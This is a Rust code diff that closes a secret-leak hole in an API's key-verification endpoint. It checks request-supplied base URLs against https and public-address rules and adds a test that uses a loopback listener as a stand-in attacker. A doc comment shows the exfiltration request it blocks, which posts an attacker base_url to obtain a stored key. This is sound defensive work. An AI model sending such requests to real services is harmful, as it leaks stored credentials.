@@ -2236,15 +2236,56 @@ pub mod secrets {
         Ok(value.to_string())
     }
 
+    /// A `base_url` supplied in a request body decides where a stored
+    /// provider key is sent as a bearer token, so it gets the same egress
+    /// rules as a configured provider URL: https only (plain http only to
+    /// loopback, and only with the provider loopback opt-in), and a host
+    /// that resolves to public addresses (`validate_url`). Without this a
+    /// token holder could post `{"base_url":"https://attacker"}` to
+    /// `/api/secrets/<name>/verify` and receive the stored key (audit
+    /// SEC-04).
+    fn provider_verify_url_allowed(base_url: &str) -> Result<(), String> {
+        let parsed =
+            url::Url::parse(base_url).map_err(|_| format!("invalid base_url: {base_url}"))?;
+        let loopback = parsed
+            .host_str()
+            .map(|h| {
+                let h = h.trim_start_matches('[').trim_end_matches(']');
+                h.eq_ignore_ascii_case("localhost")
+                    || h.parse::<std::net::IpAddr>()
+                        .is_ok_and(|ip| ip.is_loopback())
+            })
+            .unwrap_or(false);
+        match parsed.scheme() {
+            "https" => {}
+            "http" if loopback => {}
+            other => return Err(format!("base_url must use https, not {other}")),
+        }
+        pantheon_providers::http::validate_url(base_url).map_err(|e| e.cause)
+    }
+
+    /// Stands in for a verifier whose target URL was refused: reports the
+    /// refusal without any network request.
+    struct RefusedVerifier(String);
+
+    impl pantheon_secrets::Verifier for RefusedVerifier {
+        fn verify(&self, _value: &pantheon_secrets::SecretValue) -> VerifyOutcome {
+            VerifyOutcome::Failed(format!("verification refused: {}", self.0))
+        }
+    }
+
     fn verifier_for(
         scope: SecretScope,
         base_url: Option<&str>,
     ) -> Option<Box<dyn pantheon_secrets::Verifier>> {
         match scope {
-            SecretScope::Provider => base_url.map(|u| {
-                Box::new(ProviderModelsVerifier {
+            SecretScope::Provider => base_url.map(|u| match provider_verify_url_allowed(u) {
+                Ok(()) => Box::new(ProviderModelsVerifier {
                     base_url: u.to_string(),
-                }) as Box<dyn pantheon_secrets::Verifier>
+                }) as Box<dyn pantheon_secrets::Verifier>,
+                Err(reason) => {
+                    Box::new(RefusedVerifier(reason)) as Box<dyn pantheon_secrets::Verifier>
+                }
             }),
             SecretScope::BotToken => Some(Box::new(BotTokenVerifier)),
             _ => None,
@@ -2507,6 +2548,49 @@ pub mod secrets {
             assert_eq!(status_of(&resp), 200);
             let resp = crate::dispatch(&app, &json_req("GET", "/api/secrets", ""));
             assert!(!body_of(&resp).contains("DASH_TEST_KEY"));
+            let _ = std::fs::remove_dir_all(&dir);
+        }
+
+        /// A request-supplied `base_url` must not receive a stored provider
+        /// key (audit SEC-04): a loopback listener that stands in for an
+        /// attacker host sees no request at all, and the verify result
+        /// reports the refusal.
+        #[test]
+        fn verify_refuses_to_send_a_stored_key_to_a_request_url() {
+            let (app, dir) = test_app();
+            let resp = crate::dispatch(
+                &app,
+                &json_req(
+                    "POST",
+                    "/api/secrets",
+                    r#"{"name":"SEC04_KEY","scope":"provider","value":"sk-SEC04-STORED"}"#,
+                ),
+            );
+            assert_eq!(status_of(&resp), 200, "{}", body_of(&resp));
+            let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
+            listener.set_nonblocking(true).unwrap();
+            let port = listener.local_addr().unwrap().port();
+            for base in [
+                format!("http://127.0.0.1:{port}"),
+                format!("https://127.0.0.1:{port}"),
+                "http://example.com".to_string(),
+                "ftp://example.com".to_string(),
+            ] {
+                let body = format!(r#"{{"base_url":"{base}"}}"#);
+                let resp = crate::dispatch(
+                    &app,
+                    &json_req("POST", "/api/secrets/SEC04_KEY/verify", &body),
+                );
+                let text = body_of(&resp);
+                assert!(text.contains("refused"), "{base}: {text}");
+                assert!(!text.contains("sk-SEC04-STORED"));
+            }
+            std::thread::sleep(std::time::Duration::from_millis(100));
+            assert!(
+                listener.accept().is_err(),
+                "the stored key's verifier connected to a request-supplied URL"
+            );
+            let _ = crate::dispatch(&app, &json_req("DELETE", "/api/secrets/SEC04_KEY", ""));
             let _ = std::fs::remove_dir_all(&dir);
         }
 
